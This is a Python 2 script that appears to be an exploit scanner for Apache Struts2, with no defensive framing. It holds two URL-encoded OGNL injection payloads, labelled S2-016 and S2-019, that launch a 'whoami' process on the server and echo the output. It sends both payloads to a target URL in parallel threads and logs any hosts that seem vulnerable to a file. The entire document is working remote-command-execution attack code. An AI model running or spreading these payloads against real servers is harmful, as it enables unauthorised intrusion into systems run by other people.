#!coding=utf-8
import threading
import urllib2
'''
@exp_016
@exp_019

'''

class struts2:
	
	def __init__(self,url):
		self.headers={ 'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6' }
		self.url=url
		self.run()
		pass

	def run(self):
		exp_016='redirect:${%23res%3d%23context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),%23res.setCharacterEncoding(%22UTF-8%22),%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22whoami%22})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[20000],%23d.read(%23e),%23res.getWriter().println(%23e),%23res.getWriter().flush(),%23res.getWriter().close()}'
		exp_019='debug=command&expression=%23res%3d%23context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),%23res.setCharacterEncoding(%22UTF-8%22),%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22whoami%22})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[20000],%23d.read(%23e),%23res.getWriter().println(%23e),%23res.getWriter().flush(),%23res.getWriter().close()'
		t1=threading.Thread(target=self.s_,args=(exp_016,"S_016"))
		t2=threading.Thread(target=self.s_,args=(exp_019,"S_019"))
		t1.start()
		t2.start()
		t1.join()
		t2.join()

	def s_(self,exp,tag):
		try:
			req=urllib2.Request(url=self.url,data=exp,headers=self.headers)
			res=urllib2.urlopen(req)
			if res.code==200:
				body=res.read()
				if "\x00" in body:
					result=self.url+" "+tag
					f=open("./output/struts2.txt","a")
					f.write(result+"\n")
					f.close()
					print "[*struts2*]"+result
		except Exception,e:
			#print e
			pass

